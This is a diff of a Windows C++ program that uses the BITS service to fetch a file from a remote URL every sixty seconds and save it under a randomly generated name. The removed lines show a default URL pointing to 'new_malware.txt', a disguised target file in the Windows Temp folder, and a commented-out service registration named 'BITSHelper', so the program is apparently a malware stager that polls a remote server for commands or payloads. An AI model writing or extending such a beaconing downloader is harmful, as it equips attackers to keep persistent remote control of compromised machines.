@@ -5,6 +5,8 @@
 #include <locale>
 #include <codecvt>
 #include <fstream>
+#include <random>
+#include <ctime>
 
 #pragma comment(lib, "Bits.lib")
 
@@ -22,6 +24,22 @@
 //        break;
 //    }
 //}
+
+// Function to generate a random filename like 'ksfjs32dj4545kf.txt'
+std::wstring GenerateRandomFilename() {
+    const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
+    std::wstring filename;
+    const int length = 16;  // Length of the random string before the extension
+    std::mt19937 rng(static_cast<unsigned int>(time(0)));  // Seed with current time
+    std::uniform_int_distribution<int> dist(0, wcslen(charset) - 1);
+
+    for (int i = 0; i < length; ++i) {
+        filename += charset[dist(rng)];
+    }
+
+    filename += L".txt";  // Append the .txt extension
+    return filename;
+}
 
 // Read a command from the file
 std::wstring readCommentFromFile(const std::wstring& filePath) {
@@ -167,28 +185,32 @@ void DownloadFile(const std::wstring& remoteUrl, const std::wstring& localFile) 
 //}
 
 int wmain(int argc, wchar_t* argv[]) {
-    std::wstring remoteUrl = L"http://localhost:8080/updates/new_malware.txt";  // Default URL
-
-    if (argc > 1) {
-        remoteUrl = argv[1];  // Use the first command-line argument
+    // Check if the user provided the remote URL and local directory as parameters
+    if (argc < 3) {
+        wprintf(L"Usage: <program> <remoteUrl> <localDirectory>\n");
+        return 1;  // Return an error if the required parameters are missing
     }
 
-    std::wstring localFile = L"C:\\Windows\\Temp\\c7d5fbc1-2f27-4f0b-b1bd-0c6dae457414.cgv";  // Target file path
+    std::wstring remoteUrl = argv[1];  // Use the first command-line argument as the remote URL
+    std::wstring localDir = argv[2];   // Use the second command-line argument as the local directory
+
+    // Ensure the local directory path ends with a backslash (if not already)
+    if (localDir.back() != L'\\') {
+        localDir += L'\\';
+    }
+
+    std::wstring localFile = localDir + GenerateRandomFilename();  // Append random filename to the directory path
 
     wprintf(L"Using URL: %s\n", remoteUrl.c_str());
-    
-    /*SERVICE_TABLE_ENTRY ServiceTable[] = {
-        { const_cast<LPWSTR>(L"BITSHelper"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
-        { NULL, NULL }
-    };
+    wprintf(L"Generated local file: %s\n", localFile.c_str());
 
-    StartServiceCtrlDispatcher(ServiceTable);
-    return 0;*/
-
+    // Simulate a repeated download every minute
     while (true) {
         CoInitialize(nullptr);
-        DownloadFile(remoteUrl, localFile);
+        DownloadFile(remoteUrl, localFile);  // Download the file with the generated filename
         CoUninitialize();
-        Sleep(60000);
+        Sleep(60000);  // Wait for 60 seconds before downloading again
     }
+
+    return 0;
 }
